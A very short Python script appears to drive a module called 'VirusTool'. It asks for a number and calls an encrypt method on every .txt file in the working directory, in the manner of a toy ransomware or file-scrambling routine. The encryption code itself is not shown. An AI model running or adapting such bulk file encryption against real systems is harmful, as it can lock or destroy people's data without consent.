from VirusTool import Naming
import glob
RN = int(input("Enter a random number:\n"))
for files in glob.glob("*.txt"):
    file = Naming(files)
    file.encrypt(RN)
